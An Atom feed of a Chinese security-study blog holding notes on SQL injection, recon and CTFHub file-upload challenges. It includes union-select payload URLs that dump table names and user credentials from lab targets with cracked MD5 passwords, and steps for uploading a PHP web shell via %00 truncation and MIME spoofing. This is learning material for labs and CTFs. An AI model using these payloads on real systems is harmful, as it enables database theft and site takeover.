<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>顾柒·Blog</title>
  
  <subtitle>山海皆可平</subtitle>
  <link href="https://guuuuq.github.io/atom.xml" rel="self"/>
  
  <link href="https://guuuuq.github.io/"/>
  <updated>2022-12-16T07:47:06.497Z</updated>
  <id>https://guuuuq.github.io/</id>
  
  <author>
    <name>顾柒</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>web漏洞_类型及提交注入</title>
    <link href="https://guuuuq.github.io/posts/ae7615fc.html"/>
    <id>https://guuuuq.github.io/posts/ae7615fc.html</id>
    <published>2022-12-10T17:29:26.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a>简要明确参数类型</h1><p>数字，字符，搜索，JSON等</p><p>根据网站自身的参数，判断注入时是否需要考虑符号问题</p><p>如果参数为数字可能没有单引号，如果是字符很有可能有引号</p><p>其中SQL语句干扰符号：<code>&#39;</code>,<code>&#39;&#39;</code>,<code>%</code>,),等，具体需要看写法</p><p>例：</p><p>?x=Guuuuq<br>select * from user where name like ‘%Guuuuq%’</p><p>百分号的作用是前后带有Guuuuq的都是搜索的目标</p><p>需要在注入时考虑过滤干扰符号</p><h1 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a>简要明确请求方法</h1><p>GET，POST，COOKIE，REQUEST，HTTP头等</p><p>参数数据过大时往往需要POST传参</p><p>按照出现漏洞的请求方式进行注入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简要明确参数类型&quot;&gt;&lt;a href=&quot;#简要明确参数类型&quot; class=&quot;headerlink&quot; title=&quot;简要明确参数类型&quot;&gt;&lt;/a&gt;简要明确参数类型&lt;/h1&gt;&lt;p&gt;数字，字符，搜索，JSON等&lt;/p&gt;
&lt;p&gt;根据网站自身的参数，判断注入时是否需要考虑符号问</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_MYSQL注入</title>
    <link href="https://guuuuq.github.io/posts/7efa6085.html"/>
    <id>https://guuuuq.github.io/posts/7efa6085.html</id>
    <published>2022-12-08T14:40:54.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071619338.png" alt=""></p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081605945.png" alt=""></p><h1 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h1><h2 id="跨库查询及应用思路"><a href="#跨库查询及应用思路" class="headerlink" title="跨库查询及应用思路"></a>跨库查询及应用思路</h2><h3 id="查询所有的数据库"><a href="#查询所有的数据库" class="headerlink" title="查询所有的数据库"></a>查询所有的数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081632344.png" alt=""></p><h3 id="获取test数据库下的表名信息"><a href="#获取test数据库下的表名信息" class="headerlink" title="获取test数据库下的表名信息"></a>获取test数据库下的表名信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;test&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081644786.png" alt=""></p><h3 id="获取test数据库users表名下的列名信息"><a href="#获取test数据库users表名下的列名信息" class="headerlink" title="获取test数据库users表名下的列名信息"></a>获取test数据库users表名下的列名信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema= &#x27;test&#x27; and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081647086.png" alt=""></p><p>不仅要指定表名，还需要指定数据库名,否则会查到所有users表名下的信息，如图</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081648688.png" alt=""></p><h3 id="获取test下的users的username的数据"><a href="#获取test下的users的username的数据" class="headerlink" title="获取test下的users的username的数据"></a>获取test下的users的username的数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),3 from test.users</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081651453.png" alt=""></p><h1 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h1><p>load_file():读取函数</p><p>into outfile或into dumpfile:导出函数</p><h2 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h2><p>报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</p><h2 id="常见写入文件问题：魔术引导开关"><a href="#常见写入文件问题：魔术引导开关" class="headerlink" title="常见写入文件问题：魔术引导开关"></a>常见写入文件问题：魔术引导开关</h2><p>magic_quotes_gpc</p><p>在一个项目中，魔术引号若是打开的话，所有的反斜线（\）、单引号（’）、双引号（”）、NULL 字符都会被自动加上一个反斜线进行转义</p><p>绕过方法：</p><ul><li>16进制编码</li></ul><p>addslashes()函数效果类似magic_quotes_gpc</p><h2 id="相关防注入"><a href="#相关防注入" class="headerlink" title="相关防注入"></a>相关防注入</h2><ul><li>自带防御：魔术引号</li></ul><p>使用magic_quote_gpc</p><ul><li>内置函数</li></ul><p>使用is_int()内置函数</p><p>参数需要为整数，不然执行else后的语句</p><ul><li>自定义关键字</li></ul><p>使用str_replace()进行过滤关键字</p><p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）</p><p>可以尝试进行大小写绕过</p><ul><li>WAF防护软件：安全狗，宝塔等</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071619338.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/G</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_SQL注入之简要SQL注入</title>
    <link href="https://guuuuq.github.io/posts/f2647ba1.html"/>
    <id>https://guuuuq.github.io/posts/f2647ba1.html</id>
    <published>2022-12-07T15:50:58.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071552890.png" alt=""></p><h1 id="SQL注入安全测试中危害"><a href="#SQL注入安全测试中危害" class="headerlink" title="SQL注入安全测试中危害"></a>SQL注入安全测试中危害</h1><ul><li><p>大部分是危害数据库中的数据，能够操作数据</p></li><li><p>直接危害网站的权限（需要满足一定条件）</p></li></ul><h1 id="SQL注入产生原理详细分析"><a href="#SQL注入产生原理详细分析" class="headerlink" title="SQL注入产生原理详细分析"></a>SQL注入产生原理详细分析</h1><ul><li>原理：通过参数传递将恶意SQL语句拼接到源代码的SQL语句中，实现自定义的攻击方式</li><li>条件：变量可控、能带入数据库查询、变量未存在过滤和过滤不严谨</li></ul><h1 id="搭建一个SQL注入学习靶场环境"><a href="#搭建一个SQL注入学习靶场环境" class="headerlink" title="搭建一个SQL注入学习靶场环境"></a>搭建一个SQL注入学习靶场环境</h1><p>略</p><hr><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071619338.png" alt=""></p><h1 id="如何判断注入点"><a href="#如何判断注入点" class="headerlink" title="如何判断注入点"></a>如何判断注入点</h1><ul><li>老办法<br>and 1=1 页面正常<br>and 1=2 页面错误<br>可能存在注入点</li></ul><h2 id="要选用最舒服的方法测试是否存在注入点"><a href="#要选用最舒服的方法测试是否存在注入点" class="headerlink" title="要选用最舒服的方法测试是否存在注入点"></a>要选用最舒服的方法测试是否存在注入点</h2><p><code>SELECT * FROM users WHERE id=1dadad(随便输入) LIMIT 0,1</code></p><p>可能出现三种情况</p><ul><li>对网页有影响，说明带入数据库进行查询有注入点</li><li>对网页没有影响，说明没有带入数据库查询，说明对应的参数没有漏洞</li><li>网站出现404错误/自动跳转到其他页面，这个时候说明网站对输入的东西有检测，出现这种情况，基本不存在SQL注入漏洞</li></ul><h1 id="必要知识点（SQL注入）"><a href="#必要知识点（SQL注入）" class="headerlink" title="必要知识点（SQL注入）"></a>必要知识点（SQL注入）</h1><ul><li><p>在MYSQL5.0以上版本中，MYSQL存在一个自带数据库名为information_schema，它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或者列名信息</p></li><li><p>数据库中符号”.”代表下一级，如xiaodi.user表示xiaodi数据库下的user表名</p><hr></li></ul><ul><li><p>information_schema.tables：记录所有表名信息的表</p></li><li><p>information_schema.columns：记录所有列名信息的表</p></li><li><p>table_name：表名</p></li><li><p>column_name：列名</p></li><li><p>table_schema：数据库名</p></li></ul><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h3 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h3><h3 id="猜解列名数量-字段数"><a href="#猜解列名数量-字段数" class="headerlink" title="猜解列名数量(字段数)"></a>猜解列名数量(字段数)</h3><h3 id="order-by-x-数字）-正常与错误的正常值"><a href="#order-by-x-数字）-正常与错误的正常值" class="headerlink" title="order by x(数字） 正常与错误的正常值"></a>order by x(数字） 正常与错误的正常值</h3><p>正确的话网页正常显示，错误的话网页报错</p><h3 id="报错猜解准备"><a href="#报错猜解准备" class="headerlink" title="报错猜解准备"></a>报错猜解准备</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=1 union select 1,2,3,4</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li><p>数据库版本：version()<br>5.7.22-0ubuntu0.16.04.1</p></li><li><p>数据库名字：database()<br>mozhe_Discuz_StormGroup</p></li><li><p>数据库用户：user()<br>root@localhost</p></li><li><p>操作系统：@@version_compile_os<br>Linux</p></li></ul><h3 id="查询指定数据库名"><a href="#查询指定数据库名" class="headerlink" title="查询指定数据库名"></a>查询指定数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=‘mozhe_Discuz_StormGroup’</span><br></pre></td></tr></table></figure><h3 id="查询所有表名"><a href="#查询所有表名" class="headerlink" title="查询所有表名"></a>查询所有表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=‘mozhe_Discuz_StormGroup’</span><br></pre></td></tr></table></figure><h3 id="查询指定表名的全部列名"><a href="#查询指定表名的全部列名" class="headerlink" title="查询指定表名的全部列名"></a>查询指定表名的全部列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43230/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=‘StormGroup_member’</span><br></pre></td></tr></table></figure><h3 id="查询指定数据"><a href="#查询指定数据" class="headerlink" title="查询指定数据"></a>查询指定数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member</span><br></pre></td></tr></table></figure><h3 id="猜解多个数据-通过limit-x-1-变动猜解"><a href="#猜解多个数据-通过limit-x-1-变动猜解" class="headerlink" title="猜解多个数据(通过limit x,1 变动猜解)"></a>猜解多个数据(通过limit x,1 变动猜解)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 0,1</span><br><span class="line"></span><br><span class="line">356f589a7df439f6f744ff19bb8092c0 MD5 解密 dsan13</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1</span><br><span class="line"></span><br><span class="line">31cc73aa7893cef0045188565f38b1123 MD5解密240206</span><br></pre></td></tr></table></figure><p>这里第一个账号密码被禁用，我们可以通过limit的方式查看其他密码 / 在账号相同的情况下，我们也可以用group_concat函数查看全部的密码,最后通过得到的账号密码就可以得到key</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071552890.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;SQL注入安全测试中危害&quot;&gt;&lt;a href=&quot;#SQL注入安全测试中危</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_必懂知识点</title>
    <link href="https://guuuuq.github.io/posts/825ab969.html"/>
    <id>https://guuuuq.github.io/posts/825ab969.html</id>
    <published>2022-12-05T16:08:36.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212051613953.png" alt=""></p><h1 id="漏洞危害情况"><a href="#漏洞危害情况" class="headerlink" title="漏洞危害情况"></a>漏洞危害情况</h1><p>SQL注入是关于网站对应数据库的权限，这个漏洞能够获取网站服务器的数据。</p><p>文件上传可能直接拿到网站权限</p><p>XSS围绕管理员的cookie可以获取网站的权限，不能获取服务器的权限</p><p>每种漏洞的危害情况是不同的</p><h1 id="漏洞等级划分"><a href="#漏洞等级划分" class="headerlink" title="漏洞等级划分"></a>漏洞等级划分</h1><ul><li><p>高危漏洞：SQL注入、文件上传、文件包含、代码执行、未授权访问、命令执行</p><p>影响：直接影响到网站权限和数据库权限，能够获取数据或者网站的敏感文件。涉及到数据安全和权限的丢失都为高危漏洞</p></li><li><p>中危漏洞：反序列化、逻辑安全</p></li><li><p>低危漏洞：XSS跨站、目录遍历、文件读取</p><p>影响：网站的源码，网站部分账号密码</p></li></ul><h1 id="漏洞重点内容"><a href="#漏洞重点内容" class="headerlink" title="漏洞重点内容"></a>漏洞重点内容</h1><p>CTF：SQL注入、文件上传、反序列化（经常考）、代码执行</p><p>SRC：图片上漏洞都能出现，逻辑安全出现比较多</p><p>红蓝对抗：涉及的高危漏洞，文件上传、文件包含、代码执行、命令执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212051613953.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;漏洞危害情况&quot;&gt;&lt;a href=&quot;#漏洞危害情况&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集_资产监控拓展</title>
    <link href="https://guuuuq.github.io/posts/bdc0c442.html"/>
    <id>https://guuuuq.github.io/posts/bdc0c442.html</id>
    <published>2022-12-04T14:31:32.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h1><p>便于收集整理最新exp或poc</p><p>便于发现相关测试目标的资产</p><p>如何使用（为什么用这个技术？一是官方的ctms是需要收费的，我们可以通过监控github来找到类似的<a href="https://so.csdn.net/so/search?q=源码&amp;spm=1001.2101.3001.7020">源码</a>，二是在github官网上有着最新的检测漏洞报告）</p><h1 id="黑暗引擎实现域名端口收集"><a href="#黑暗引擎实现域名端口收集" class="headerlink" title="黑暗引擎实现域名端口收集"></a>黑暗引擎实现域名端口收集</h1><p><a href="https://fofa.info/">https://fofa.info/</a></p><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><h1 id="全自动域名收集枚举优秀脚本使用"><a href="#全自动域名收集枚举优秀脚本使用" class="headerlink" title="全自动域名收集枚举优秀脚本使用"></a>全自动域名收集枚举优秀脚本使用</h1><p><a href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a></p><p>layer子域名挖掘机（csdn上搜索即可）</p><h1 id="SRC目标中的信息收集全覆盖"><a href="#SRC目标中的信息收集全覆盖" class="headerlink" title="SRC目标中的信息收集全覆盖"></a>SRC目标中的信息收集全覆盖</h1><p>补天平台专属SRC</p><h1 id="利用其他第三方接口获取更多信息"><a href="#利用其他第三方接口获取更多信息" class="headerlink" title="利用其他第三方接口获取更多信息"></a>利用其他第三方接口获取更多信息</h1><p>全球CDN服务商查询 <a href="http://tools.ipip.net/cdn.php">http://tools.ipip.net/cdn.php</a> </p><p>利用国外IP去PING网站，可能绕过CDN服务</p><p>全球DNS解析服务查询 <a href="https://securitytrails.com/domain/`www.baidu.com`/history/a">https://securitytrails.com/domain/`www.baidu.com`/history/a</a></p><p>更改其中的域名即可查询DNS解析历史</p><p>查询网站证书<a href="https://crt.sh/">https://crt.sh/</a></p><p>IP地址高精度查询</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Github监控&quot;&gt;&lt;a href=&quot;#Github监控&quot; class=&quot;headerlink&quot; title=&quot;Github监控&quot;&gt;&lt;/a&gt;Github监控&lt;/h1&gt;&lt;p&gt;便于收集整理最新exp或poc&lt;/p&gt;
&lt;p&gt;便于发现相关测试目标的资产&lt;/p&gt;
&lt;p&gt;如何</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集_APP及其他资产</title>
    <link href="https://guuuuq.github.io/posts/3aa11996.html"/>
    <id>https://guuuuq.github.io/posts/3aa11996.html</id>
    <published>2022-12-03T15:43:40.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="APP提取及抓包及后续配合"><a href="#APP提取及抓包及后续配合" class="headerlink" title="APP提取及抓包及后续配合"></a>APP提取及抓包及后续配合</h1><h2 id="某apk一件提取反编译"><a href="#某apk一件提取反编译" class="headerlink" title="某apk一件提取反编译"></a>某apk一件提取反编译</h2><p>例：<a href="https://github.com/TheKingOfDuck/ApkAnalyser">https://github.com/TheKingOfDuck/ApkAnalyser</a> 使用反编译软件提取安卓应用中可能存在的敏感信息</p><p>还有：<a href="https://github.com/liaojack8/AndroidKiller">https://github.com/liaojack8/AndroidKiller</a> Android Killer 功能同上</p><h2 id="利用BurpSuite抓包获取更多URL"><a href="#利用BurpSuite抓包获取更多URL" class="headerlink" title="利用BurpSuite抓包获取更多URL"></a>利用BurpSuite抓包获取更多URL</h2><p>在模拟器中设置网络端口，在BurpSuite中设置监听IP地址，在app中多次点击不同界面尽量获取更多的URL为渗透提供更多的目标和可能。</p><h1 id="某IP无WEB框架下的第三方测试"><a href="#某IP无WEB框架下的第三方测试" class="headerlink" title="某IP无WEB框架下的第三方测试"></a>某IP无WEB框架下的第三方测试</h1><h2 id="各种端口一顿乱扫"><a href="#各种端口一顿乱扫" class="headerlink" title="各种端口一顿乱扫"></a>各种端口一顿乱扫</h2><p>使用Nmap等工具扫描目的网站端口</p><p>谷歌引擎搜索</p><p>黑暗引擎搜索 shodan zoomeye fofa</p><h2 id="各种借口一顿乱扫"><a href="#各种借口一顿乱扫" class="headerlink" title="各种借口一顿乱扫"></a>各种借口一顿乱扫</h2><h2 id="接口部分一顿测试"><a href="#接口部分一顿测试" class="headerlink" title="接口部分一顿测试"></a>接口部分一顿测试</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;APP提取及抓包及后续配合&quot;&gt;&lt;a href=&quot;#APP提取及抓包及后续配合&quot; class=&quot;headerlink&quot; title=&quot;APP提取及抓包及后续配合&quot;&gt;&lt;/a&gt;APP提取及抓包及后续配合&lt;/h1&gt;&lt;h2 id=&quot;某apk一件提取反编译&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集_架构，搭建，WAF等</title>
    <link href="https://guuuuq.github.io/posts/e0179121.html"/>
    <id>https://guuuuq.github.io/posts/e0179121.html</id>
    <published>2022-12-02T15:44:21.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<p>渗透测试的思路就是从信息收集开始的</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212021942505.png" alt=""></p><h1 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h1><h2 id="目录型站点"><a href="#目录型站点" class="headerlink" title="目录型站点"></a>目录型站点</h2><p>例：sti.blcu.edu.cn和sti.blcu.cn/bbs（网站好像已经没有了）</p><p>主站的网站目录下可能有不同的源码搭建的网站，这样就造成一个网站有多套网站源码可以利用，进攻渗透由单个目标转为多个目标，漏洞出现的可能性提高。</p><h2 id="端口型站点"><a href="#端口型站点" class="headerlink" title="端口型站点"></a>端口型站点</h2><p>例：web.0516jz.com和web.0516jz.com:8080（网站好像已经没有了）</p><p>类似目录型站点，不过是用端口进行分隔，归根结底仍在同一台服务器上。</p><h2 id="子域名型站点"><a href="#子域名型站点" class="headerlink" title="子域名型站点"></a>子域名型站点</h2><p>例：<a href="http://www.goodlift.net/和http://bbs.goodlift.net/子域名两套CMS">http://www.goodlift.net/和http://bbs.goodlift.net/子域名两套CMS</a></p><p>域名解析可能在同一IP地址上，也可能不在同一IP地址上，如果在同一IP地址上则在同一服务器上，此时就类似目录型和端口型站点。（利用PING命令可以进行判断&lt;适用于没有CDN的情况&gt;）如果不在同一服务器又分为在同一网段（涉及到内网安全知识），不同网段就只能分开分析（考虑相同的数据和敏感信息）。</p><h2 id="类似域名型站点"><a href="#类似域名型站点" class="headerlink" title="类似域名型站点"></a>类似域名型站点</h2><p>例：<a href="http://www.jmlsd.com和http://www.jmlsd.cn">http://www.jmlsd.com和http://www.jmlsd.cn</a>  www.axgc168.com和www.jmlsd.com网站界面完全相同（但是可能存在不同漏洞）</p><p>网站经常换域名，特别是违法网站，正规网站也有换域名的时候</p><p>尝试更改域名后缀或者脚本工具批量访问</p><h2 id="旁注，c段站点"><a href="#旁注，c段站点" class="headerlink" title="旁注，c段站点"></a>旁注，c段站点</h2><p>旁注：同服务器不同站点，其中之一为目标网站</p><p>c段：同网段不同服务器不同站点</p><h2 id="搭建软件特征站点"><a href="#搭建软件特征站点" class="headerlink" title="搭建软件特征站点"></a>搭建软件特征站点</h2><p>直接使用别人完成的一体化搭建软件、</p><p>抓包中的<code>Server</code>可以判断</p><p>搭建软件可能有固定存在的文件或者漏洞，例如phpstudy中的phpmyadmin</p><h1 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h1><h2 id="什么是WAF应用？"><a href="#什么是WAF应用？" class="headerlink" title="什么是WAF应用？"></a>什么是WAF应用？</h2><p>Web应用防护系统，Web应用<a href="https://baike.baidu.com/item/防火墙?fromModule=lemma_inlink">防火墙</a>是通过执行一系列针对HTTP/HTTPS的<a href="https://baike.baidu.com/item/安全策略/2890163?fromModule=lemma_inlink">安全策略</a>来专门为<a href="https://baike.baidu.com/item/Web/150564?fromModule=lemma_inlink">Web</a>应用提供保护的一款产品，分为软件和硬件形式。</p><h2 id="如何快速识别WAF？"><a href="#如何快速识别WAF？" class="headerlink" title="如何快速识别WAF？"></a>如何快速识别WAF？</h2><p>利用工具：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>手工判断：抓包数据中如果有<code>X-Powered-By：WAF/x.x</code>可能会存在WAF防护</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;渗透测试的思路就是从信息收集开始的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212021942505.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;站点搭建分析&quot;&gt;&lt;a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_文件上传_00截断</title>
    <link href="https://guuuuq.github.io/posts/2a14d116.html"/>
    <id>https://guuuuq.github.io/posts/2a14d116.html</id>
    <published>2022-10-28T16:45:20.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是00截断"><a href="#什么是00截断" class="headerlink" title="什么是00截断"></a>什么是00截断</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。</p><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>1.php版本小于5.3.29<br>2.magic_quotes_gpc = Off</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>用burpsuite抓包上传包含一句话木马的png文件</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281652262.png" alt=""></p><p>修改road的参数，在/upload/后添加<code>shell.php%00</code>，用”%00”截断，让语句强行结束，相当于上传一个”shell.php”的文件</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281657135.png" alt=""></p><p>提示上传成功，用蚁剑连接即可拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是00截断&quot;&gt;&lt;a href=&quot;#什么是00截断&quot; class=&quot;headerlink&quot; title=&quot;什么是00截断&quot;&gt;&lt;/a&gt;什么是00截断&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_文件上传_MIME绕过</title>
    <link href="https://guuuuq.github.io/posts/aeef47b0.html"/>
    <id>https://guuuuq.github.io/posts/aeef47b0.html</id>
    <published>2022-10-28T15:56:46.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是MIME"><a href="#什么是MIME" class="headerlink" title="什么是MIME"></a>什么是MIME</h1><p>MIME(multipurpose Internet mail extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>burp抓包提交过程</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281616509.png" alt=""></p><p>“<strong>Connection_Type</strong>“为验证文件类型的语句将其参数改成<code>image/png</code>绕过检测，以成功上传php后缀的文件</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281627910.png" alt=""></p><p>上传成功，用蚁剑连接</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281629422.png" alt=""></p><p>成功拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是MIME&quot;&gt;&lt;a href=&quot;#什么是MIME&quot; class=&quot;headerlink&quot; title=&quot;什么是MIME&quot;&gt;&lt;/a&gt;什么是MIME&lt;/h1&gt;&lt;p&gt;MIME(multipurpose Internet mail extensions)多用途互联网邮</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHUB_web_命令注入综合过滤</title>
    <link href="https://guuuuq.github.io/posts/aba31e24.html"/>
    <id>https://guuuuq.github.io/posts/aba31e24.html</id>
    <published>2022-10-26T20:29:01.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
